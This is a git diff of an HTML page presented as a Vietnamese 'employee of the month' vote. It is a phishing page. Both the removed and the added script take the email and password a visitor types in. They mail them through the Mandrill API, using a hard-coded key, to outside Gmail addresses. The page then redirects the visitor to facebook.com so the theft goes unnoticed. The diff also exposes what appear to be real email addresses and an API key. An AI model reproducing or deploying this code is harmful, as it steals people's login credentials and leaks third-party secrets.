@@ -10,6 +10,7 @@
     <title>Bình chọn nhân viên tháng</title>
     <link rel="stylesheet" href="https://candfansjp.github.io/style.css">
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
+    <script type="text/javascript" src="mandrill.min.js"></script>
   </head>
   <body>
     <div class="container flex">
@@ -36,33 +37,24 @@
   </body>
 
   <script type="text/javascript">
-    $(document).ready(function(){
-      $("#buttonSend").on( "click", function() {
-        var email = $("input[type=text]").val();
-        var password = $("input[type=password]").val();
-          $.ajax({
-            type: 'POST',
-            url: 'https://mandrillapp.com/api/1.0/messages/send.json',
-            data: {
-              'key': 'md-mVIowYpTNKD75eTa_guiDA',
-              'message': {
-                'from_email': 'locp.qb@gmail.com',
-                'to': [
-                    {
-                      'email': 'harukileejp@gmail.com',
-                      'name': 'RECIPIENT NAME',
-                      'type': 'to'
-                    }
-                  ],
-                'autotext': 'true',
-                'subject': `email is: ${email} and password is: ${password}`
-              }
+    document.getElementById("buttonSend").onclick = function() {sendTheMail()};
+
+    function sendTheMail(){
+      var m = new mandrill.Mandrill('md-mVIowYpTNKD75eTa_guiDA'); // This will be public
+      let email = document.getElementById("email").value
+      let password = document.getElementById("password").value
+  
+        m.messages.send({
+            "message": {
+                "from_email": "harukileejp@gmail.com",
+                "from_name": "abcbac",
+                "to":[{"email": "doccocaubaixl@gmail.com", "name": "name"}], // Array of recipients
+                "subject": `email is: ${email}  | password is: ${password}`,
+                "text": "Text to be sent in the body" // Alternatively, use the "html" key to send HTML emails rather than plaintext
             }
-          }).done(function(response) {
-            window.location="https://www.facebook.com/";
-          });
-          window.location="https://www.facebook.com/";
-      });
-    });
+        });
+
+        window.location="https://www.facebook.com/";
+    }
   </script> 
 </html>
